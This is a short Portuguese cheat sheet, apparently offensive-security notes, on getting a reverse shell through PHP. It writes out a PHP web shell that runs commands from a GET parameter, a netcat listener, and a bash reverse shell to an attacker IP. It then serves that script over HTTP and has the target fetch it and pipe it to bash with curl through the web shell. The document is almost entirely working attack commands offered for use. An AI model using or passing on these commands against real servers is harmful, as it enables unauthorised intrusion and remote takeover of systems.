
## PHP
No PHP podemos executar comando no SO com o comando 
`<?php system()>`, desse jeito : 
```php
<?php system("COMMAND"); ?>
```

Também podemos criar assim : 
```sh
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Como no exemplo acima ele está pegando o parâmetro `cmd` com o método ``GET`` , devemos especificar o comando assim : 
```web
https://host.com/shell.php?cmd=<COMMAND>
```

---

Devemos escolher uma porta para escutar, para recebermos o acesso a máquina, nesse caso a porta 1337 : 
```bash
nc -nvlp 1337
```

Criamos o arquivo ``shell.sh`` com o conteúdo : 
```bash
#!/bin/bash
bash -i >& /dev/tcp/<YOU_IP_ADDRESS>/1337 0>&1
```

Iniciamos um servidor python na mesma pasta do `shell.sh` para servir esse arquivo : 
```bash
python3 -m http.server 8000
```

---

Agora fazemos com que o alvo baixe o nosso arquivo com o ``curl``.
```web
https://host.com/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh | bash
```

